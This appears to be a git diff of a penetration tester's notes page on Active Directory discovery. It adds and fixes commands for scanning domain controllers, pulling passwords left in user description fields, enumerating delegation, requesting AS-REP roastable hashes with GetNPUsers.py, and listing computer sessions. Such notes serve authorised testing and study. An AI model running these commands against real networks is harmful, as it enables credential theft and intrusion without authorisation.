@@ -21,6 +21,8 @@ permalink: /pen/ad/discov
 * [shoot](#shoot)
 	* [shoot-forest](#shoot-forest)
 	* [shoot-dom](#shoot-dom)
+		* [shoot-dcs](#shoot-dcs)
+		* [shoot-pwd-desc](#shoot-pwd-desc)
 		* [shoot-pwd-policy](#shoot-pwd-policy)
 		* [shoot-delegations](#shoot-delegations)
 		* [shoot-priv-users](#shoot-priv-users)
@@ -36,7 +38,7 @@ permalink: /pen/ad/discov
 	* [iter-memberof](#iter-memberof)
 	* [iter-scope](#iter-scope)
 * [refresh](#refresh)
-	* [check-computer-access](#check-computer-access)
+	* [check-computer-sessions](#check-computer-sessions)
 	* [last-logons](#last-logons)
 	* [last-logons-computer](#last-logons-computer)
 	* [last-logons-ou](#last-logons-ou)
@@ -58,7 +60,7 @@ permalink: /pen/ad/discov
 ### <a name='tools'></a>tools
 
 <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
-<script>$(window).load(function() {var repos = ["https://api.github.com/repos/c3c/ADExplorerSnapshot.py", "https://api.github.com/repos/fox-it/BloodHound.py", "https://api.github.com/repos/Porchetta-Industries/CrackMapExeccrackmapexec", "https://api.github.com/repos/iphelix/dnschef", "https://api.github.com/repos/CiscoCXSecurity/enum4linux", "https://github.com/franc-pentest/ldeep", "https://api.github.com/repos/the-useless-one/pywerview"]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.updated_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
+<script>$(window).load(function() {var repos = ["https://api.github.com/repos/c3c/ADExplorerSnapshot.py", "https://api.github.com/repos/fox-it/BloodHound.py", "https://api.github.com/repos/Porchetta-Industries/CrackMapExeccrackmapexec", "https://api.github.com/repos/iphelix/dnschef", "https://api.github.com/repos/CiscoCXSecurity/enum4linux", "https://api.github.com/repos/franc-pentest/ldeep", "https://api.github.com/repos/the-useless-one/pywerview"]; for (rep in repos) {$.ajax({type: "GET", url: repos[rep], dataType: "json", success: function(result) {$("#repo_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.updated_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>
 
 <link href="/sortable.css" rel="stylesheet" />
 <script src="/sortable.js"></script>
@@ -129,7 +131,7 @@ for i in `cat $zcase"_trusts_clean.txt"`; do ping -a $i; done
 
 ### <a name='shoot-dom'></a>shoot-dom
 
-#### <a name='shoot-dom'></a>shoot-dcs
+#### <a name='shoot-dcs'></a>shoot-dcs
 ```sh
 # scanning the lan
 nmap $zdom_fqdn --script broadcast-dhcp-discover
@@ -154,6 +156,12 @@ nmap $zdom_fqdn --script dns-srv-enum --script-args "dns-srv-enum.domain='$zdom_
 nbtscan -r 10.0.0.0/24
 ```
 
+#### <a name='shoot-pwd-desc'></a>shoot-desc-users
+```sh
+cme ldap -u $ztarg_user_name -p $ztarg_user_pass -kdcHost $zdom_dc_fqdn -d $zdom_fqdn -M get-desc-users > $zcase"_cme_ldap_get-desc-users.txt"
+grep -i "pass|pw|=" $zcase"_cme_ldap_get-desc-users.txt"
+```
+
 #### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
 ```sh
 crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
@@ -164,21 +172,16 @@ rpcclient> getdompwinfo
 ```
 
 #### <a name='shoot-delegations'></a>shoot-delegations
-
-* Easy enumeration with **Impacket\FindDelegation.py**:
 ```bash
 # with password in the CLI
 zz=$zdom_fqdn'/'$ztarg_user_name':'$ztarg_user_pass 
-
 findDelegation.py  $zz -dc-ip $zdom_dc_ip
 
 # with kerberos auth / password not in the CLI
-zz=$zdom_fqdn'/'$ztarg_user_name'
+zz=$zdom_fqdn'/'$ztarg_user_name
 findDelegation.py  $zz -k -no-pass
-```
 
-* Emum attribute ms-DS-AllowedToActOnBehalfOfOtherIdentity:
-```sh 
+# enum attribute ms-DS-AllowedToActOnBehalfOfOtherIdentity
 ztarg_computer_name=""
 pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --computername $ztarg_computer_name
 grep ms-DS-AllowedToActOnBehalfOfOtherIdentity
@@ -254,9 +257,9 @@ GetUserSPNs.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -
 ```
 
 #### <a name='shoot-npusers'></a>shoot-npusers
-```
+```sh
 # https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
-GetNPUsers.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -request >> np_users.txt 
+GetNPUsers.py $zz -dc-ip $zdom_dc_ip -request >> np_users.txt 
 ```
 
 #### <a name='shoot-dacl'></a>shoot-dacl
@@ -322,7 +325,7 @@ i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's
 
 ## <a name='refresh'></a>refresh
 
-### <a name='check-computer-access'></a>check-computer-sessions
+### <a name='check-computer-sessions'></a>check-computer-sessions
 ```sh
 netview.py $zz -target $ztarg_computer_ip
 netview.py $zz -target $ztarg_computer_ip -user $ztarg_user_name
